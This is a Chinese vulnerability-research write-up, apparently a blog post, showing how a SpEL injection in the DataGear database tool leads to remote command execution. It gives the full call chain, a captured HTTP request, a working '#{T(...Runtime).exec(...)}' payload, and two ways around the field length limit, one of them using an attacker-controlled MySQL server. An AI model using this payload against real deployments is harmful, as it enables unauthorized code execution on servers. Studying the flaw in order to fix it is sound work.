# SPEL 漏洞挖掘之从sql插入到命令执行的奇思妙想-先知社区

> **来源**: https://xz.aliyun.com/news/18905  
> **文章ID**: 18905

---

# SPEL 漏洞挖掘之从sql插入到命令执行的奇思妙想

## 前言

核心在于寻找思路，和过程中的思考，正常的寻找一定会遇到很对坑点的，但是记录下这些坑点，复盘的时候才会看见自己的思考过程，之后才能挖掘到更多的漏洞

## spel 漏洞的寻找

SpeL 表达式语言在 EvaluationContext 上下文类型除了提供默认的 StandardEvaluationContext 外，还提供了 SimpleEvaluationContext。

【风险】SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用，而 StandardEvaluationContext 是支持全部 SpEL 语法的，它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行，因为 SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 T(Type) 来调用任意类方法

EvaluationContext 的情况下默认采用的是 StandardEvaluationContext，所以默认情况下 SpEL 表达式求值存在代码注入导致 RCE 的风险。

举一个例子

```
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class test_Class {
    public static void main(String [] args) {
        ExpressionParser parser =new SpelExpressionParser();
        Expression exp1=parser.parseExpression("T(Runtime).getRuntime().exec("calc")");
        Object obj=exp1.getValue();
        System.out.println(obj);
    }
}

```

所以我的思路是寻找 SpelExpressionParser 解析表达式的地方

![](images/20250918165505-2b91106c-946d-1.png)

跟进看一下代码

```
protected Object evaluateVariableExpression(Connection cn, Table table, Column column, String value,
            NameExpression expression, ExpressionEvaluationContext expressionEvaluationContext,
            List<Object> expressionValues) throws Throwable
    {
        Object expValue;

        org.springframework.expression.Expression spelExpression = null;

        try
        {
            spelExpression = this.spelExpressionParser.parseExpression(expression.getContent());
        }
        catch (Throwable t)
        {
            // 如果是表达式不合法，且列是文本类型，则忽略计算
            if (JdbcUtil.isTextType(column.getType()))
                expValue = expression.toString();
            else
                throw new SqlParamValueVariableExpressionSyntaxException(table, column, value, expression.getContent(),
                        t);
        }

        try
        {
            expValue = spelExpression.getValue(expressionEvaluationContext.getVariableExpressionBean());
        }
        catch (Throwable t)
        {
            // 如果是表达式不合法，且列是文本类型，则忽略计算
            if (JdbcUtil.isTextType(column.getType()))
                expValue = expression.toString();
            else
                throw new SqlParamValueVariableExpressionException(table, column, value, expression.getContent(), t);
        }

        expressionValues.add(expValue);
        expressionEvaluationContext.putCachedValue(expression, expValue);

        return expValue;
    }
```

很明显的存在 spel 表达式注入  
这只是我们的 sink 点，还需要寻找到 source 点  
一般我就是

![](images/20250918165506-2c5a551c-946d-1.png)

然后一步一步找回去  
我就不放过程了直接给个调用栈

```
evaluateVariableExpression:324, ConversionSqlParamValueMapper (org.datagear.persistence.support)
evaluateVariableExpressions:304, ConversionSqlParamValueMapper (org.datagear.persistence.support)
resolveExpressionIf:253, ConversionSqlParamValueMapper (org.datagear.persistence.support)
map:209, ConversionSqlParamValueMapper (org.datagear.persistence.support)
mapToSqlParamValue:637, DefaultPersistenceManager (org.datagear.persistence.support)
buildUniqueRecordCondition:548, DefaultPersistenceManager (org.datagear.persistence.support)
get:350, DefaultPersistenceManager (org.datagear.persistence.support)
execute:484, DataController$10 (org.datagear.web.controller)
doExecute:207, AbstractSchemaConnTableController$VoidSchemaConnTableExecutor (org.datagear.web.controller)
doExecute:102, AbstractSchemaConnTableController$AbstractSchemaConnTableExecutor (org.datagear.web.controller)
doExecute:230, AbstractSchemaConnController$AbstractSchemaConnExecutor (org.datagear.web.controller)
execute:200, AbstractSchemaConnTableController$VoidSchemaConnTableExecutor (org.datagear.web.controller)
view:492, DataController (org.datagear.web.controller)
doFilter:94, AnonymousAuthenticationFilterExt (org.datagear.web.security)
doFilter:122, LoginLatchFilter (org.datagear.web.security)
```

source 点是在

```
@RequestMapping("/{schemaId}/{tableName}/view")  
public String view(HttpServletRequest request, HttpServletResponse response,  
       org.springframework.ui.Model springModel, @PathVariable("schemaId") String schemaId,  
       @PathVariable("tableName") String tableName, @RequestBody Map<String, ?> paramData) throws Throwable  
{  
    final User user = WebUtils.getUser();  
    final Row row = convertToRow(paramData);  
  
    final DefaultLOBRowMapper rowMapper = buildFormDefaultLOBRowMapper();  
  
    new VoidSchemaConnTableExecutor(request, response, springModel, schemaId, tableName, true)  
    {  
       @Override  
       protected void execute(HttpServletRequest request, HttpServletResponse response,  
             org.springframework.ui.Model springModel, Schema schema, Table table) throws Throwable  
       {  
          checkReadTableDataPermission(schema, user);  
  
          Connection cn = getConnection();  
  
          Row formModel = persistenceManager.get(cn, null, table, row, buildConditionSqlParamValueMapper(),  
                rowMapper);  
  
          if (formModel == null)  
             throw new RecordNotFoundException();  
  
          setFormModel(springModel, formModel, REQUEST_ACTION_VIEW, SUBMIT_ACTION_NONE);  
       }  
    }.execute();  
  
    setFormPageAttributes(request, springModel);  
  
    return "/data/data_form";  
}
```

然后对应到页面上是在  
![](images/20250918165507-2cd35714-946d-1.png)

## 具体调试分析

### 传入格式要求

我们随便输入一点东西看是如何传入的

抓到的东西如下

```
POST /data/05e68bfdb192acaf4006/t_analysis/view?ppid=pidm2lg6lf1 HTTP/1.1
Host: 127.0.0.1:50401
Content-Length: 29
sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:50401
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:50401/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Authorization=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcyOTA4MDMxMywiZXhwIjoxNzI5Njg1MTEzfQ.70VIRyaTKNOLVEnnPi_rV3LHqWWyFnS3YVZud3DCoBgiU2bc8xpm8wahbPsqAa-gRgWOaW9enf_lTAIoRq0pkg; USER_ID_ANONYMOUS=97269975b0004387b7443950946b97a8; DETECTED_VERSION=5.1.0; REMEMBER_ME=YWRtaW46MTc2MTAzODYzNjIzNjoxMDRkMDQ4NzZhYjIzMmYyNmQ0M2I5MGI1MWNmMTM0Ng; MAIN_MENU_COLLAPSE=false; DETECT_NEW_VERSION_RESOLVED=true; JSESSIONID=660B349C0A48E5C7768D015521CE61B2
Connection: keep-alive

{"NAME":"aaa","VALUE":"0.00"}
```

应该就是 name 或则 value 值了

```
protected Sql buildUniqueRecordCondition(Connection cn, Dialect dialect, Table table, Row row,
            SqlParamValueMapper mapper, ReleasableRegistry releasableRegistry) throws PersistenceException
    {
        Column[] columns = getUniqueRecordColumns(table);

        Sql sql = Sql.valueOf().delimit(" AND ");

        for (int i = 0; i < columns.length; i++)
        {
            Column column = columns[i];
            String name = column.getName();

            Object value = row.get(name);

            SqlParamValue sqlParamValue = mapToSqlParamValue(cn, table, column, value, mapper, releasableRegistry);

            
```

这里就是我们控制的值拿出来的流程，可以看到的是 for 循环得到列名和列的值

![](images/20250918165508-2d6cb65c-946d-1.png)

然后简单看一下中间还有没有处理过程  
发现我们的值传入到 resolveExpressionIf 方法的时候就已经截断了

```
protected Object resolveExpressionIf(Connection cn, Table table, Column column, Object value) throws Throwable
    {
        if (!(value instanceof String))
            return value;

        String valueStr = (String) value;
        Object result = valueStr;

        if (this.enableVariableExpression)
        {
            List<NameExpression> expressions = this.variableExpressionResolver.resolveNameExpressions(valueStr);

            if (!expressions.isEmpty())
                result = evaluateVariableExpressions(cn, table, column, valueStr, expressions,
                        this.expressionEvaluationContext);
            else
                result = this.variableExpressionResolver.unescape(valueStr);
        }
```

我们的值根本没有传入到 evaluateVariableExpressions 方法中，因为 expressions 为空，现在就需要具体看看原因

可以看见我们是值是被 resolveNameExpressions 方法处理了

跟进

```
public List<Expression> resolve(String source)
    {
        if (source == null || source.isEmpty())
            return Collections.emptyList();

        List<Expression> expressions = new ArrayList<Expression>(3);

        Expression next = null;
        int startIndex = 0;

        while ((next = resolveNextExpression(source, startIndex)) != null)
        {
            expressions.add(next);
            startIndex = next.getEndIndex();
        }

        return expressions;
    }
```

是在这里 add 的，初始化，然后 resolveNextExpression 处理

最终的处理逻辑如下

```
protected Expression resolveNextExpression(String source, int startIndex)
    {
        int length = source.length();

        for (int i = startIndex; i < length;)
        {
            // 起始标识符转义
            if (source.charAt(i) == this.escaper && matchAtIndex(source, i + 1, this.startIdentifier))
            {
                i += this.startIdentifier.length() + 1;
            }
            else if (matchAtIndex(source, i, this.startIdentifier))
            {
                StringBuilder content = new StringBuilder();

                int j = i + this.startIdentifier.length();

                while (j < length)
                {
                    char cj = source.charAt(j);

                    // 结束标识符转义
                    if (cj == this.escaper && matchAtIndex(source, j + 1, this.endIdentifier))
                    {
                        content.append(this.endIdentifier);
                        j += this.endIdentifier.length() + 1;
                    }
                    else if (matchAtIndex(source, j, this.endIdentifier))
                    {
                        break;
                    }
                    else
                    {
                        content.append(cj);
                        j += 1;
                    }
                }

                if (j >= length || content.length() == 0)
                {
                    i = j + 1;
                    continue;
                }
                else
                {
                    return newExpressionInstance(this.startIdentifier, this.endIdentifier, source.substring(i, j + 1),
                            i, j + 1, content.toString().trim());
                }
            }
            else
                i += 1;
        }

        return null;
    }
```

只有符合匹配的时候才能不返回 null

![](images/20250918165509-2df93942-946d-1.png)

![](images/20250918165509-2e57e33e-946d-1.png)

其实也就是这种表达式

```
#{表达式内容}
```

然后我们修改表达式，弹出计算器

```
#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')}
```

但是修改的时候出现了问题

### 突破长度限制

![](images/20250918165510-2ec367a8-946d-1.png)

显示我们的 name 太长了

sql 语句爆出的错误  
我这里的思路是因为我们可以执行 sql 语句，尝试新建一个表

```
CREATE TABLE my_table (
    name VARCHAR(300)
);

```

![](images/20250918165511-2f18dbca-946d-1.png)

可惜被禁止了，然后尝试一下修改最大长度限制呢

```
ALTER TABLE my_table
MODIFY COLUMN name VARCHAR(500);

```

![](images/20250918165511-2f6a491a-946d-1.png)  
也不被应许

也尝试了一下简单的去绕过 sql 语句  
但是都失败了，因为我看过代码，根本没有过滤，也没有找到相关的检测逻辑

#### 方法一

上面的代码逻辑我们也是分析过了，因为是回 for 循环去遍历我们的内容，只要数据名中有一个长度没有限制得很厉害，那么我们就可以执行表达式  
然后就是一个一个去尝试  
因为这是在本地搭建的，我们可以直接去数据库看一下  
![](images/20250918165512-2fcb6f88-946d-1.png)  
发现了这个表的 address 的限制不是很短，我们尝试一下

![](images/20250918165512-30261d8c-946d-1.png)  
保存成功后点击查看  
![](images/20250918165513-30791750-946d-1.png)  
![](images/20250918165514-30e955f6-946d-1.png)

#### 方法二

然后思考了一会，因为这个数据库工具是可以连接其他数据库的  
考虑到在实战中的使用，我决定在公网弄一个 mysql

因为一般数据库是敏感信息，所以默认不可以外面访问的，我们需要配置一下  
修改 `/etc/mysql/mysql.conf.d/mysqld.cnf` 文件

```
root@VM-16-17-ubuntu:~# cat /etc/mysql/mysql.conf.d/mysqld.cnf

#

# The MySQL database server configuration file.

#

# One can use all long options that the program supports.

# Run program with --help to get a list of available options and with

# --print-defaults to see which it would actually understand and use.

#

# For explanations see

# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

# Here is entries for some specific programs

# The following values assume you have at least 32M ram

[mysqld]

#

# * Basic Settings

#

user = mysql

# pid-file = /var/run/mysqld/mysqld.pid

# socket = /var/run/mysqld/mysqld.sock

# port = 3306

# datadir = /var/lib/mysql

# If MySQL is running as a replication slave, this should be

# changed. Ref https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_tmpdir

# tmpdir = /tmp

#

# Instead of skip-networking the default is now to listen only on

# localhost which is more compatible and is not less secure.

bind-address = 127.0.0.1

mysqlx-bind-address = 127.0.0.1
```

首先需要把 127.0.0.1 改成 0.0.0.0 表示任何都可以访问

然后还需要修改/etc/mysql/my.cnf 文件

```
root@VM-16-17-ubuntu:~# cat /etc/mysql/my.cnf
#
# The MySQL database server configuration file.
#
# You can copy this to one of:
# - "/etc/mysql/my.cnf" to set global options,
# - "~/.my.cnf" to set user-specific options.
# 
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

#
# * IMPORTANT: Additional settings that can override those from this file!
#   The files must end with '.cnf', otherwise they'll be ignored.
#
```

你需要添加  
[mysqld]   
bind-address = 0.0.0.0

然后新建一个用户

`CREATE USER 'your_user'@'%' IDENTIFIED BY 'your_password'; GRANT ALL PRIVILEGES ON`

然后就是创建一个表，设置字符限制

```
mysql> CREATE TABLE my_table (
    ->  
    ->     name VARCHAR(65535)
    -> ) ENGINE=InnoDB;
ERROR 1074 (42000): Column length too big for column 'name' (max = 16383); use BLOB or TEXT instead
mysql> CREATE TABLE my_table (       name VARCHAR(1000) ) ENGINE=InnoDB;
Query OK, 0 rows affected (0.04 sec)

mysql> DESCRIBE my_table;
+-------+---------------+------+-----+---------+-------+
| Field | Type          | Null | Key | Default | Extra |
+-------+---------------+------+-----+---------+-------+
| name  | varchar(1000) | YES  |     | NULL    |       |
+-------+---------------+------+-----+---------+-------+
1 row in set (0.00 sec)
```

然后我们尝试先连接这个数据库

![](images/20250918165514-315ed3ba-946d-1.png)  
然后开始尝试能不能输入了

![](images/20250918165515-31a4dd9e-946d-1.png)

成功保存了  
![](images/20250918165516-32088312-946d-1.png)

随便点击一个查看  
![](images/20250918165516-326338b6-946d-1.png)  
弹出计算器成功执行了表达式

## 最后

可能有更简单的做法，但是人一旦确定了思维方向就有点被限制住了，感觉每次遇到这种问题，就喜欢一根筋的去弄，知道有其他方法，但是就是喜欢不断思考突破的过程，每次有突破一点，都会有更多成就感
